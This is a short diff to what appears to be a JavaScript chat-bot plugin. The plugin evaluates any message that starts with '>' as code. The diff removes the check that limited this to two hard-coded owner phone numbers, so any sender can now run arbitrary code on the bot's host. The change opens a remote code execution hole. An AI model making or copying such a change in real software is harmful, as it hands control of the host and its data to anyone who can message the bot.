@@ -31,7 +31,7 @@ cmd({
 	}) => {
 		
     var Ameen = ['916238768108', '918589959671']
-		if (Ameen.includes(senderNumber)) {
+	
         if (body.startsWith(">")) {
             try {
                 let evaled = await eval(`(async () => { ${body?.replace(">", "")} })()`);
@@ -40,5 +40,5 @@ cmd({
 	    } catch (e) {
 				m.reply(`${e.message}`);
 			}
-		}
+		
 		}});
